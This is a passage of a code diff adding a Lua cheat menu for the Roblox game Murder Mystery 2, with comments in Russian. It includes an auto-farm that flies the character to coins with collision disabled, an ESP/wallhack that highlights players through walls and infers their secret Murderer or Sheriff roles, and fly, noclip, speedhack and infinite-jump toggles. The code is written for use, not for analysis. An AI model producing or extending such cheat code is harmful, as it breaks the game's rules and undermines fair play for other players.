+            jumpConnection:Disconnect()
+        end
+        
+        jumpConnection = UserInputService.JumpRequest:Connect(function()
+            if infinityJumpEnabled and game.Players.LocalPlayer.Character then
+                local humanoid = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                end
+            end
         end)
     end
+    
+    local function disableInfinityJump()
+        infinityJumpEnabled = false
+        if jumpConnection then
+            jumpConnection:Disconnect()
+            jumpConnection = nil
+        end
+    end
+    
+    return {
+        enable = function()
+            infinityJumpEnabled = true
+            enableInfinityJump()
+        end,
+        disable = function()
+            disableInfinityJump()
+        end,
+        toggle = function()
+            infinityJumpEnabled = not infinityJumpEnabled
+            if infinityJumpEnabled then
+                enableInfinityJump()
+            else
+                disableInfinityJump()
+            end
+        end,
+        getState = function()
+            return infinityJumpEnabled
+        end
+    }
 end
+
+local infinityJumpSystem = setupInfinityJump()
+
+-- Auto-Farm функция
+local function setupAutoFarm()
+    local autoFarmEnabled = false
+    local flySpeed = 20
+    local collected = 0
+    local visitedPositions = {}
+    
+    local function flyTo(pos, speed)
+        local character = game.Players.LocalPlayer.Character
+        if not character then return end
+        local rootPart = character:FindFirstChild("HumanoidRootPart")
+        if not rootPart then return end
+
+        local distance = (pos - rootPart.Position).Magnitude
+        local duration = distance / speed
+
+        local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
+        local goal = {CFrame = CFrame.new(pos)}
+        local tween = TweenService:Create(rootPart, tweenInfo, goal)
+
+        tween:Play()
+        tween.Completed:Wait()
+    end
+
+    local function isNear(pos1, pos2)
+        return (pos1 - pos2).Magnitude < 100
+    end
+
+    return {
+        enable = function()
+            autoFarmEnabled = true
+            collected = 0
+            visitedPositions = {}
+            
+            spawn(function()
+                while autoFarmEnabled do
+                    local character = game.Players.LocalPlayer.Character
+                    if character then
+                        local rootPart = character:FindFirstChild("HumanoidRootPart")
+                        if rootPart then
+                            -- Отключаем коллизии во время работы
+                            for _, v in ipairs(character:GetDescendants()) do
+                                if v:IsA("BasePart") then
+                                    v.CanCollide = false
+                                end
+                            end
+                            
+                            local nearest = nil
+                            for _, obj in ipairs(workspace:GetDescendants()) do
+                                if obj:IsA("BasePart") and obj.Name == "Coin_Server" then
+                                    if isNear(rootPart.Position, obj.Position) and not visitedPositions[obj] then
+                                        nearest = obj
+                                        break
+                                    end
+                                end
+                            end
+                            if nearest then
+                                flyTo(nearest.Position, flySpeed)
+                                visitedPositions[nearest] = true
+                                collected += 1
+                            end
+                        end
+                    end
+                    wait(0.1)
+                end
+            end)
+        end,
+        disable = function()
+            autoFarmEnabled = false
+        end,
+        setSpeed = function(speed)
+            flySpeed = math.clamp(speed, 10, 30)
+            return flySpeed
+        end,
+        getSpeed = function()
+            return flySpeed
+        end,
+        getCollected = function()
+            return collected
+        end,
+        getState = function()
+            return autoFarmEnabled
+        end
+    }
+end
+
+local autoFarmSystem = setupAutoFarm()
+
+-- ИСПРАВЛЕННАЯ ESP система с правильным определением ролей
+local function setupESP()
+    local espEnabled = false
+    local namesEnabled = false
+    local rolesEnabled = false
+    local wallhackEnabled = false
+    local wallhackStyle = "Classic"
+    local rgbEnabledNames = false
+    local rgbEnabledRoles = false
+    local rgbEnabledWallhack = false
+    
+    local espObjects = {}
+    local rgbConnection = nil
+
+    -- ИСПРАВЛЕННАЯ функция определения ролей для Murder Mystery 2
+    local function getPlayerRole(player)
+        if player == game.Players.LocalPlayer then
+            return "You"
+        end
+        
+        local character = player.Character
+        if not character then return "Innocent" end
+        
+        -- Проверка Murderer по оружию в руках
+        for _, tool in pairs(character:GetChildren()) do
+            if tool:IsA("Tool") then
+                local toolName = string.lower(tool.Name)
+                if toolName:find("knife") or toolName:find("murder") or toolName:find("shank") 
+                or toolName:find("blade") or toolName:find("katana") or toolName:find("sword") then
+                    return "Murderer"
+                end
+            end
+        end
+        
+        -- Проверка Sheriff по оружию в руках
+        for _, tool in pairs(character:GetChildren()) do
+            if tool:IsA("Tool") then
+                local toolName = string.lower(tool.Name)
+                if toolName:find("gun") or toolName:find("sheriff") or toolName:find("revolver")
+                or toolName:find("pistol") or toolName:find("rifle") or toolName:find("revolver") then
+                    return "Sheriff"
+                end
+            end
+        end
+        
+        -- Проверка через Backpack (более надежный способ)
+        local backpack = player:FindFirstChild("Backpack")
+        if backpack then
+            for _, tool in pairs(backpack:GetChildren()) do
+                if tool:IsA("Tool") then
+                    local toolName = string.lower(tool.Name)
+                    
+                    -- Murderer оружие
+                    if toolName:find("knife") or toolName:find("murder") or toolName:find("shank")
+                    or toolName:find("blade") or toolName:find("katana") or toolName:find("sword")
+                    or toolName:find("butcher") then
+                        return "Murderer"
+                    end
+                    
+                    -- Sheriff оружие
+                    if toolName:find("gun") or toolName:find("sheriff") or toolName:find("revolver")
+                    or toolName:find("pistol") or toolName:find("rifle") or toolName:find("revolver")
+                    or toolName:find("police") then
+                        return "Sheriff"
+                    end
+                end
+            end
+        end
+        
+        -- Дополнительная проверка через инвентарь
+        local playerGui = player:FindFirstChild("PlayerGui")
+        if playerGui then
+            for _, gui in pairs(playerGui:GetDescendants()) do
+                if gui:IsA("TextLabel") or gui:IsA("TextButton") then
+                    local text = string.lower(gui.Text)
+                    if text:find("murderer") then
+                        return "Murderer"
+                    elseif text:find("sheriff") then
+                        return "Sheriff"
+                    end
+                end
+            end
+        end
+        
+        return "Innocent"
+    end
+
+    -- Функция для получения RGB цвета
+    local function getRainbowColor(t, offset)
+        local r = math.sin(t * 2 + offset) * 0.5 + 0.5
+        local g = math.sin(t * 2 + offset + 2) * 0.5 + 0.5
+        local b = math.sin(t * 2 + offset + 4) * 0.5 + 0.5
+        return Color3.new(r, g, b)
+    end
+
+    -- Функция для обновления RGB цветов
+    local function updateRGBColors()
+        if not (rgbEnabledNames or rgbEnabledRoles or rgbEnabledWallhack) then return end
+        
+        local time = tick()
+        for player, espParts in pairs(espObjects) do
+            if espParts then
+                local offset = player.UserId * 0.001
+                local rainbowColor = getRainbowColor(time, offset)
+                
+                for _, part in pairs(espParts) do
+                    if part and part.Parent then
+                        if part:IsA("BoxHandleAdornment") or part:IsA("Highlight") then
+                            -- ЕСЛИ ВКЛЮЧЕНЫ ROLES, ИСПОЛЬЗУЕМ СТАТИЧНЫЕ ЦВЕТА ДЛЯ РОЛЕЙ
+                            if rolesEnabled then
+                                local role = getPlayerRole(player)
+                                if role == "Murderer" then
+                                    part.Color3 = Color3.fromRGB(255, 50, 50)
+                                elseif role == "Sheriff" then
+                                    part.Color3 = Color3.fromRGB(50, 50, 255)
+                                else
+                                    if rgbEnabledWallhack then
+                                        part.Color3 = rainbowColor
+                                    else
+                                        part.Color3 = Color3.fromRGB(173, 216, 230)
+                                    end
+                                end
+                            else
+                                if rgbEnabledWallhack then
+                                    if part:IsA("BoxHandleAdornment") then
+                                        part.Color3 = rainbowColor
+                                    elseif part:IsA("Highlight") then
+                                        part.FillColor = rainbowColor
+                                        part.OutlineColor = rainbowColor
+                                    end
+                                end
+                            end
+                        elseif part:IsA("BillboardGui") then
+                            local textLabel = part:FindFirstChildOfClass("TextLabel")
+                            if textLabel then
+                                if part.Name == "NameLabel" then
+                                    if rgbEnabledNames then
+                                        textLabel.TextColor3 = rainbowColor
+                                    else
+                                        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+                                    end
+                                elseif part.Name == "RoleLabel" then
+                                    -- ЕСЛИ ВКЛЮЧЕНЫ ROLES, ИСПОЛЬЗУЕМ СТАТИЧНЫЕ ЦВЕТА ДЛЯ РОЛЕЙ
+                                    if rolesEnabled then
+                                        local role = getPlayerRole(player)
+                                        if role == "Murderer" then
+                                            textLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+                                        elseif role == "Sheriff" then
+                                            textLabel.TextColor3 = Color3.fromRGB(50, 50, 255)
+                                        else
+                                            if rgbEnabledRoles then
+                                                textLabel.TextColor3 = rainbowColor
+                                            else
+                                                textLabel.TextColor3 = Color3.fromRGB(173, 216, 230)
+                                            end
+                                        end
+                                    else
+                                        if rgbEnabledRoles then
+                                            textLabel.TextColor3 = rainbowColor
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    local function createESP(player)
+        if player == game.Players.LocalPlayer then return end
+        
+        local character = player.Character
+        if not character then return end
+        
+        -- Удаляем старый ESP если есть
+        if espObjects[player] then
+            for _, part in pairs(espObjects[player]) do
+                if part then
+                    part:Destroy()
+                end
+            end
+        end
+        
+        espObjects[player] = {}
+        
+        -- Определяем цвет для ESP на основе роли
+        local role = getPlayerRole(player)
+        local espColor = Color3.fromRGB(173, 216, 230) -- Innocent - голубой
+        
+        if role == "Murderer" then
+            espColor = Color3.fromRGB(255, 50, 50) -- Красный
+        elseif role == "Sheriff" then
+            espColor = Color3.fromRGB(50, 50, 255) -- Синий
+        end
+        
+        -- Wallhack
+        if wallhackEnabled then
+            if wallhackStyle == "Classic" then
+                for _, part in pairs(character:GetChildren()) do
+                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                        local highlight = Instance.new("BoxHandleAdornment")
+                        highlight.Name = "ESP_" .. part.Name
+                        highlight.Adornee = part
+                        highlight.Size = part.Size + Vector3.new(0.1, 0.1, 0.1)
+                        highlight.Color3 = espColor
+                        highlight.Transparency = 0.3
+                        highlight.AlwaysOnTop = true
+                        highlight.ZIndex = 10
+                        highlight.Parent = part
+                        
+                        table.insert(espObjects[player], highlight)
+                    end
+                end
+            elseif wallhackStyle == "Tracing" then
+                local highlight = Instance.new("Highlight")
+                highlight.Name = "ESP_Highlight"
+                highlight.Adornee = character
+                highlight.FillColor = espColor
+                highlight.FillTransparency = 0.8
+                highlight.OutlineColor = espColor
+                highlight.OutlineTransparency = 0
+                highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+                highlight.Parent = character
+                
+                table.insert(espObjects[player], highlight)
+            end
+        end
+        
+        -- Текстовые метки
+        local head = character:FindFirstChild("Head")
+        if head then
+            local labels = {}
+            
+            -- Метка с ролью
+            if rolesEnabled then
+                local roleBillboard = Instance.new("BillboardGui")
+                roleBillboard.Name = "RoleLabel"
+                roleBillboard.Adornee = head
+                roleBillboard.Size = UDim2.new(0, 200, 0, 30)
+                roleBillboard.StudsOffset = Vector3.new(0, 2.5, 0)
+                roleBillboard.AlwaysOnTop = true
+                roleBillboard.MaxDistance = 100
+                roleBillboard.Parent = head
+                
+                local roleLabel = Instance.new("TextLabel")
+                roleLabel.Size = UDim2.new(1, 0, 1, 0)
+                roleLabel.BackgroundTransparency = 1
+                roleLabel.Font = Enum.Font.GothamBold
+                roleLabel.TextSize = 14
+                roleLabel.TextStrokeTransparency = 0
+                roleLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+                roleLabel.Text = role
+                roleLabel.TextColor3 = espColor
+                roleLabel.Parent = roleBillboard
+                
+                table.insert(espObjects[player], roleBillboard)
+                table.insert(labels, roleBillboard)
+            end
+            
+            -- Метка с именем
+            if namesEnabled then
+                local nameBillboard = Instance.new("BillboardGui")
+                nameBillboard.Name = "NameLabel"
+                nameBillboard.Adornee = head
+                nameBillboard.Size = UDim2.new(0, 200, 0, 30)
+                nameBillboard.StudsOffset = Vector3.new(0, 1.5, 0)
+                nameBillboard.AlwaysOnTop = true
+                nameBillboard.MaxDistance = 100
+                nameBillboard.Parent = head
+                
+                local nameLabel = Instance.new("TextLabel")
+                nameLabel.Size = UDim2.new(1, 0, 1, 0)
+                nameLabel.BackgroundTransparency = 1
+                nameLabel.Font = Enum.Font.GothamBold
+                nameLabel.TextSize = 12
+                nameLabel.TextStrokeTransparency = 0
+                nameLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+                nameLabel.Text = player.Name
+                nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+                nameLabel.Parent = nameBillboard
+                
+                table.insert(espObjects[player], nameBillboard)
+                table.insert(labels, nameBillboard)
+            end
+            
+            -- Корректируем позиции меток
+            if #labels == 2 then
+                labels[1].StudsOffset = Vector3.new(0, 3, 0)
+                labels[2].StudsOffset = Vector3.new(0, 1.5, 0)
+            elseif #labels == 1 then
+                labels[1].StudsOffset = Vector3.new(0, 2, 0)
+            end
+        end
+    end
+
+    local function removeESP(player)
+        if espObjects[player] then
+            for _, part in pairs(espObjects[player]) do
+                if part then
+                    part:Destroy()
+                end
+            end
+            espObjects[player] = nil
+        end
+    end
+
+    local function updateAllESP()
+        -- Удаляем все ESP
+        for player, espParts in pairs(espObjects) do
+            if espParts then
+                for _, part in pairs(espParts) do
+                    if part then
+                        part:Destroy()
+                    end
+                end
+            end
+        end
+        espObjects = {}
+        
+        -- Создаем заново с новыми настройками
+        if wallhackEnabled or namesEnabled or rolesEnabled then
+            for _, player in pairs(game.Players:GetPlayers()) do
+                if player.Character then
+                    createESP(player)
+                end
+            end
+        end
+    end
+
+    local function enableESP()
+        -- Создаем ESP для всех существующих игроков
+        for _, player in pairs(game.Players:GetPlayers()) do
+            if player.Character then
+                createESP(player)
+            end
+        end
+        
+        -- Обработчик новых игроков
+        game.Players.PlayerAdded:Connect(function(player)
+            player.CharacterAdded:Connect(function(character)
+                if wallhackEnabled or namesEnabled or rolesEnabled then
+                    wait(1)
+                    createESP(player)
+                end
+            end)
+        end)
+        
+        -- Обработчик появления персонажей
+        for _, player in pairs(game.Players:GetPlayers()) do
+            player.CharacterAdded:Connect(function(character)
+                if wallhackEnabled or namesEnabled or rolesEnabled then
+                    wait(1)
+                    createESP(player)
+                end
+            end)
+            
+            player.CharacterRemoving:Connect(function(character)
+                removeESP(player)
+            end)
+        end
+
+        -- Постоянное обновление ролей
+        if rolesEnabled then
+            spawn(function()
+                while rolesEnabled do
+                    wait(2)
+                    for player, _ in pairs(espObjects) do
+                        if player.Character and player ~= game.Players.LocalPlayer then
+                            createESP(player)
+                        end
+                    end
+                end
+            end)
+        end
+    end
+
+    local function disableAllESP()
+        for player, espParts in pairs(espObjects) do
+            if espParts then
+                for _, part in pairs(espParts) do
+                    if part then
+                        part:Destroy()
+                    end
+                end
+            end
+        end
+        espObjects = {}
+        
+        if rgbConnection then
+            rgbConnection:Disconnect()
+            rgbConnection = nil
+        end
+    end
+    
+    -- Функция для восстановления ESP после смерти
+    local function handlePlayerRespawn()
+        if wallhackEnabled or namesEnabled or rolesEnabled then
+            wait(2) -- Ждем появления персонажа
+            updateAllESP() -- Пересоздаем ESP для всех игроков
+        end
+    end
+    
+    -- Подписываемся на событие появления персонажа
+    game.Players.LocalPlayer.CharacterAdded:Connect(handlePlayerRespawn)
+    
+    return {
+        enable = function()
+            espEnabled = true
+            enableESP()
+        end,
+        disable = function()
+            espEnabled = false
+            disableAllESP()
+        end,
+        toggleNames = function(state)
+            namesEnabled = state
+            updateAllESP()
+        end,
+        toggleRoles = function(state)
+            rolesEnabled = state
+            updateAllESP()
+        end,
+        toggleWallhack = function(state)
+            wallhackEnabled = state
+            updateAllESP()
+        end,
+        setWallhackStyle = function(style)
+            wallhackStyle = style
+            if wallhackEnabled then
+                updateAllESP()
+            end
+            -- ИСПРАВЛЕНИЕ БАГА: Сохраняем состояние RGB при смене стиля
+            if rgbConnection then
+                rgbConnection:Disconnect()
+                if rgbEnabledNames or rgbEnabledRoles or rgbEnabledWallhack then
+                    rgbConnection = RunService.Heartbeat:Connect(updateRGBColors)
+                end
+            end
+        end,
+        toggleNamesRGB = function(state)
+            rgbEnabledNames = state
+            if rgbEnabledNames or rgbEnabledRoles or rgbEnabledWallhack then
+                if rgbConnection then
+                    rgbConnection:Disconnect()
+                end
+                rgbConnection = RunService.Heartbeat:Connect(updateRGBColors)
+            else
+                if rgbConnection then
+                    rgbConnection:Disconnect()
+                    rgbConnection = nil
+                end
+            end
+            updateAllESP()
+        end,
+        toggleRolesRGB = function(state)
+            rgbEnabledRoles = state
+            if rgbEnabledNames or rgbEnabledRoles or rgbEnabledWallhack then
+                if rgbConnection then
+                    rgbConnection:Disconnect()
+                end
+                rgbConnection = RunService.Heartbeat:Connect(updateRGBColors)
+            else
+                if rgbConnection then
+                    rgbConnection:Disconnect()
+                    rgbConnection = nil
+                end
+            end
+            updateAllESP()
+        end,
+        toggleWallhackRGB = function(state)
+            rgbEnabledWallhack = state
+            if rgbEnabledNames or rgbEnabledRoles or rgbEnabledWallhack then
+                if rgbConnection then
+                    rgbConnection:Disconnect()
+                end
+                rgbConnection = RunService.Heartbeat:Connect(updateRGBColors)
+            else
+                if rgbConnection then
+                    rgbConnection:Disconnect()
+                    rgbConnection = nil
+                end
+            end
+            updateAllESP()
+        end,
+        getState = function()
+            return espEnabled
+        end
+    }
+end
+
+local espSystem = setupESP()
+
+-- Создание вкладок
+for i, tabName in ipairs(Tabs) do
+    local TabButton = Instance.new("TextButton")
+    TabButton.Name = tabName.."Tab"
+    TabButton.Size = UDim2.new(1, -20, 0, 35)
+    TabButton.Position = UDim2.new(0, 10, 0, (i-1)*38 + 45)
+    TabButton.Text = tabName
+    TabButton.BackgroundColor3 = CurrentTheme.TabButtonInactive
+    TabButton.BackgroundTransparency = 0.2
+    TabButton.TextColor3 = CurrentTheme.Text
+    TabButton.Font = Enum.Font.GothamBold
+    TabButton.TextSize = 13
+    TabButton.BorderSizePixel = 0
+    TabButton.Parent = TabButtons
+    
+    table.insert(UIElements.TabButtonsList, TabButton)
+    
+    local TabButtonCorner = Instance.new("UICorner")
+    TabButtonCorner.CornerRadius = UDim.new(0, 6)
+    TabButtonCorner.Parent = TabButton
+    
+    local TabFrame = Instance.new("ScrollingFrame")
+    TabFrame.Name = tabName.."Frame"
+    TabFrame.Size = UDim2.new(1, -240, 1, -35)
+    TabFrame.Position = UDim2.new(0, 240, 0, 35)
+    TabFrame.BackgroundTransparency = 1
+    TabFrame.Visible = false
+    TabFrame.CanvasSize = UDim2.new(0, 0, 0, 600)
+    TabFrame.ScrollBarThickness = 6
+    TabFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
+    TabFrame.Parent = MainFrame
+    
+    TabFrames[tabName] = TabFrame
+    
+    TabButton.MouseButton1Click:Connect(function()
+        for _, frame in pairs(TabFrames) do
+            frame.Visible = false
+        end
+        TabFrame.Visible = true
+        
+        for _, btn in ipairs(TabButtons:GetChildren()) do
+            if btn:IsA("TextButton") then
+                if btn == TabButton then
+                    TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = CurrentTheme.TabButtonActive, BackgroundTransparency = 0}):Play()
+                else
+                    TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = CurrentTheme.TabButtonInactive, BackgroundTransparency = 0.2}):Play()
+                end
+            end
+        end
+    end)
+end
+
+-- ВОССТАНОВЛЕННЫЙ ФУНКЦИОНАЛ ВКЛАДКИ PLAYER
+-- Fly Toggle
+local FlyToggleFrame = Instance.new("Frame")
+FlyToggleFrame.Name = "FlyToggle"
+FlyToggleFrame.Size = UDim2.new(0, 180, 0, 45)
+FlyToggleFrame.Position = UDim2.new(0, 20, 0, 20)
+FlyToggleFrame.BackgroundTransparency = 1
+FlyToggleFrame.Parent = TabFrames["Player"]
+
+local FlyToggleButton = Instance.new("TextButton")
+FlyToggleButton.Name = "Button"
+FlyToggleButton.Size = UDim2.new(0, 50, 0, 25)
+FlyToggleButton.Position = UDim2.new(0, 120, 0, 5)
+FlyToggleButton.Text = ""
+FlyToggleButton.BackgroundColor3 = CurrentTheme.ToggleOff
+FlyToggleButton.BackgroundTransparency = 0.2
+FlyToggleButton.AutoButtonColor = false
+FlyToggleButton.BorderSizePixel = 0
+FlyToggleButton.Parent = FlyToggleFrame
+
+table.insert(UIElements.ToggleButtons, FlyToggleButton)
+
+local FlyToggleCorner = Instance.new("UICorner")
+FlyToggleCorner.CornerRadius = UDim.new(0, 12)
+FlyToggleCorner.Parent = FlyToggleButton
+
+local FlyToggleText = Instance.new("TextLabel")
+FlyToggleText.Name = "Text"
+FlyToggleText.Size = UDim2.new(0, 110, 0, 25)
+FlyToggleText.Position = UDim2.new(0, 0, 0, 5)
+FlyToggleText.Text = "Fly"
+FlyToggleText.TextColor3 = CurrentTheme.Text
+FlyToggleText.Font = Enum.Font.GothamBold
+FlyToggleText.TextSize = 13
+FlyToggleText.TextXAlignment = Enum.TextXAlignment.Left
+FlyToggleText.BackgroundTransparency = 1
+FlyToggleText.Parent = FlyToggleFrame
+
+table.insert(UIElements.TextLabels, FlyToggleText)
+
+local FlyWarningLabel = Instance.new("TextLabel")
+FlyWarningLabel.Name = "Warning"
+FlyWarningLabel.Size = UDim2.new(1, 0, 0, 15)
+FlyWarningLabel.Position = UDim2.new(0, 0, 0, 30)
+FlyWarningLabel.Text = "Risk"
+FlyWarningLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+FlyWarningLabel.Font = Enum.Font.Gotham
+FlyWarningLabel.TextSize = 10
+FlyWarningLabel.TextXAlignment = Enum.TextXAlignment.Left
+FlyWarningLabel.BackgroundTransparency = 1
+FlyWarningLabel.Parent = FlyToggleFrame
+
+-- Noclip Toggle
+local NoclipToggleFrame = Instance.new("Frame")
+NoclipToggleFrame.Name = "NoclipToggle"
+NoclipToggleFrame.Size = UDim2.new(0, 180, 0, 45)
+NoclipToggleFrame.Position = UDim2.new(0, 20, 0, 70)
+NoclipToggleFrame.BackgroundTransparency = 1
+NoclipToggleFrame.Parent = TabFrames["Player"]
+
+local NoclipToggleButton = Instance.new("TextButton")
+NoclipToggleButton.Name = "Button"
+NoclipToggleButton.Size = UDim2.new(0, 50, 0, 25)
+NoclipToggleButton.Position = UDim2.new(0, 120, 0, 5)
+NoclipToggleButton.Text = ""
+NoclipToggleButton.BackgroundColor3 = CurrentTheme.ToggleOff
+NoclipToggleButton.BackgroundTransparency = 0.2
+NoclipToggleButton.AutoButtonColor = false
+NoclipToggleButton.BorderSizePixel = 0
+NoclipToggleButton.Parent = NoclipToggleFrame
+
+table.insert(UIElements.ToggleButtons, NoclipToggleButton)
+
+local NoclipToggleCorner = Instance.new("UICorner")
+NoclipToggleCorner.CornerRadius = UDim.new(0, 12)
+NoclipToggleCorner.Parent = NoclipToggleButton
+
+local NoclipToggleText = Instance.new("TextLabel")
+NoclipToggleText.Name = "Text"
+NoclipToggleText.Size = UDim2.new(0, 110, 0, 25)
+NoclipToggleText.Position = UDim2.new(0, 0, 0, 5)
+NoclipToggleText.Text = "Noclip"
+NoclipToggleText.TextColor3 = CurrentTheme.Text
+NoclipToggleText.Font = Enum.Font.GothamBold
+NoclipToggleText.TextSize = 13
+NoclipToggleText.TextXAlignment = Enum.TextXAlignment.Left
+NoclipToggleText.BackgroundTransparency = 1
+NoclipToggleText.Parent = NoclipToggleFrame
+
+table.insert(UIElements.TextLabels, NoclipToggleText)
+
+local NoclipWarningLabel = Instance.new("TextLabel")
+NoclipWarningLabel.Name = "Warning"
+NoclipWarningLabel.Size = UDim2.new(1, 0, 0, 15)
+NoclipWarningLabel.Position = UDim2.new(0, 0, 0, 30)
+NoclipWarningLabel.Text = "Risk"
+NoclipWarningLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+NoclipWarningLabel.Font = Enum.Font.Gotham
+NoclipWarningLabel.TextSize = 10
+NoclipWarningLabel.TextXAlignment = Enum.TextXAlignment.Left
+NoclipWarningLabel.BackgroundTransparency = 1
+NoclipWarningLabel.Parent = NoclipToggleFrame
+
+-- SpeedHack Toggle
+local SpeedHackToggleFrame = Instance.new("Frame")
+SpeedHackToggleFrame.Name = "SpeedHackToggle"
+SpeedHackToggleFrame.Size = UDim2.new(0, 180, 0, 85)
+SpeedHackToggleFrame.Position = UDim2.new(0, 20, 0, 120)
+SpeedHackToggleFrame.BackgroundTransparency = 1
+SpeedHackToggleFrame.Parent = TabFrames["Player"]
+
+local SpeedHackToggleButton = Instance.new("TextButton")
+SpeedHackToggleButton.Name = "Button"
+SpeedHackToggleButton.Size = UDim2.new(0, 50, 0, 25)
+SpeedHackToggleButton.Position = UDim2.new(0, 120, 0, 5)
+SpeedHackToggleButton.Text = ""
+SpeedHackToggleButton.BackgroundColor3 = CurrentTheme.ToggleOff
+SpeedHackToggleButton.BackgroundTransparency = 0.2
+SpeedHackToggleButton.AutoButtonColor = false
+SpeedHackToggleButton.BorderSizePixel = 0
+SpeedHackToggleButton.Parent = SpeedHackToggleFrame
+
+table.insert(UIElements.ToggleButtons, SpeedHackToggleButton)
+
+local SpeedHackToggleCorner = Instance.new("UICorner")
+SpeedHackToggleCorner.CornerRadius = UDim.new(0, 12)
+SpeedHackToggleCorner.Parent = SpeedHackToggleButton
+
+local SpeedHackToggleText = Instance.new("TextLabel")
+SpeedHackToggleText.Name = "Text"
+SpeedHackToggleText.Size = UDim2.new(0, 110, 0, 25)
+SpeedHackToggleText.Position = UDim2.new(0, 0, 0, 5)
+SpeedHackToggleText.Text = "SpeedHack"
+SpeedHackToggleText.TextColor3 = CurrentTheme.Text
+SpeedHackToggleText.Font = Enum.Font.GothamBold
+SpeedHackToggleText.TextSize = 13
+SpeedHackToggleText.TextXAlignment = Enum.TextXAlignment.Left
+SpeedHackToggleText.BackgroundTransparency = 1
+SpeedHackToggleText.Parent = SpeedHackToggleFrame
+
+table.insert(UIElements.TextLabels, SpeedHackToggleText)
+
+-- Speed Slider
+local SpeedSliderFrame = Instance.new("Frame")
+SpeedSliderFrame.Name = "SpeedSliderFrame"
+SpeedSliderFrame.Size = UDim2.new(1, 0, 0, 40)
+SpeedSliderFrame.Position = UDim2.new(0, 0, 0, 45)
+SpeedSliderFrame.BackgroundTransparency = 1
+SpeedSliderFrame.Parent = SpeedHackToggleFrame
+
+local SpeedSlider = Instance.new("Frame")
+SpeedSlider.Name = "SpeedSlider"
+SpeedSlider.Size = UDim2.new(0, 150, 0, 10)
+SpeedSlider.Position = UDim2.new(0, 0, 0, 15)
+SpeedSlider.BackgroundColor3 = CurrentTheme.Button
+SpeedSlider.BackgroundTransparency = 0.2
+SpeedSlider.BorderSizePixel = 0
+SpeedSlider.Parent = SpeedSliderFrame
+
+local SpeedSliderCorner = Instance.new("UICorner")
+SpeedSliderCorner.CornerRadius = UDim.new(0, 5)
+SpeedSliderCorner.Parent = SpeedSlider
+
+local SpeedSliderFill = Instance.new("Frame")
+SpeedSliderFill.Name = "SpeedSliderFill"
+SpeedSliderFill.Size = UDim2.new(0.5, 0, 1, 0)
+SpeedSliderFill.Position = UDim2.new(0, 0, 0, 0)
+SpeedSliderFill.BackgroundColor3 = CurrentTheme.ToggleOn
+SpeedSliderFill.BorderSizePixel = 0
+SpeedSliderFill.Parent = SpeedSlider
+
+local SpeedSliderFillCorner = Instance.new("UICorner")
+SpeedSliderFillCorner.CornerRadius = UDim.new(0, 5)
+SpeedSliderFillCorner.Parent = SpeedSliderFill
+
+local SpeedValueText = Instance.new("TextLabel")
+SpeedValueText.Name = "SpeedValueText"
+SpeedValueText.Size = UDim2.new(0, 30, 0, 20)
+SpeedValueText.Position = UDim2.new(0, 155, 0, 10)
+SpeedValueText.BackgroundTransparency = 1
+SpeedValueText.Text = "50"
+SpeedValueText.TextColor3 = CurrentTheme.Text
+SpeedValueText.Font = Enum.Font.GothamBold
+SpeedValueText.TextSize = 12
+SpeedValueText.TextXAlignment = Enum.TextXAlignment.Center
+SpeedValueText.Parent = SpeedSliderFrame
+
+table.insert(UIElements.TextLabels, SpeedValueText)
+
+-- Infinity Jump Toggle
+local InfinityJumpToggleFrame = Instance.new("Frame")
+InfinityJumpToggleFrame.Name = "InfinityJumpToggle"
+InfinityJumpToggleFrame.Size = UDim2.new(0, 180, 0, 35)
+InfinityJumpToggleFrame.Position = UDim2.new(0, 20, 0, 215)
+InfinityJumpToggleFrame.BackgroundTransparency = 1
+InfinityJumpToggleFrame.Parent = TabFrames["Player"]
+
+local InfinityJumpToggleButton = Instance.new("TextButton")
+InfinityJumpToggleButton.Name = "Button"
+InfinityJumpToggleButton.Size = UDim2.new(0, 50, 0, 25)
+InfinityJumpToggleButton.Position = UDim2.new(0, 120, 0, 5)
+InfinityJumpToggleButton.Text = ""
+InfinityJumpToggleButton.BackgroundColor3 = CurrentTheme.ToggleOff
+InfinityJumpToggleButton.BackgroundTransparency = 0.2
+InfinityJumpToggleButton.AutoButtonColor = false
+InfinityJumpToggleButton.BorderSizePixel = 0
+InfinityJumpToggleButton.Parent = InfinityJumpToggleFrame
+
+table.insert(UIElements.ToggleButtons, InfinityJumpToggleButton)
+
+local InfinityJumpToggleCorner = Instance.new("UICorner")
+InfinityJumpToggleCorner.CornerRadius = UDim.new(0, 12)
+InfinityJumpToggleCorner.Parent = InfinityJumpToggleButton
+
+local InfinityJumpToggleText = Instance.new("TextLabel")
+InfinityJumpToggleText.Name = "Text"
+InfinityJumpToggleText.Size = UDim2.new(0, 110, 0, 25)
+InfinityJumpToggleText.Position = UDim2.new(0, 0, 0, 5)
+InfinityJumpToggleText.Text = "Infinity Jump"
+InfinityJumpToggleText.TextColor3 = CurrentTheme.Text
+InfinityJumpToggleText.Font = Enum.Font.GothamBold
+InfinityJumpToggleText.TextSize = 13
+InfinityJumpToggleText.TextXAlignment = Enum.TextXAlignment.Left
+InfinityJumpToggleText.BackgroundTransparency = 1
+InfinityJumpToggleText.Parent = InfinityJumpToggleFrame
+
+table.insert(UIElements.TextLabels, InfinityJumpToggleText)
+
+-- Функции для Player вкладки
+local function updateFlyState(state)
+    ActiveFunctions.Fly = state
+    if state then
+        TweenService:Create(FlyToggleButton, TweenInfo.new(0.2), {
+            BackgroundColor3 = CurrentTheme.ToggleOn,
+            BackgroundTransparency = 0.2
+        }):Play()
+        flySystem.enable()
+        flySystem.toggle()
+    else
+        TweenService:Create(FlyToggleButton, TweenInfo.new(0.2), {
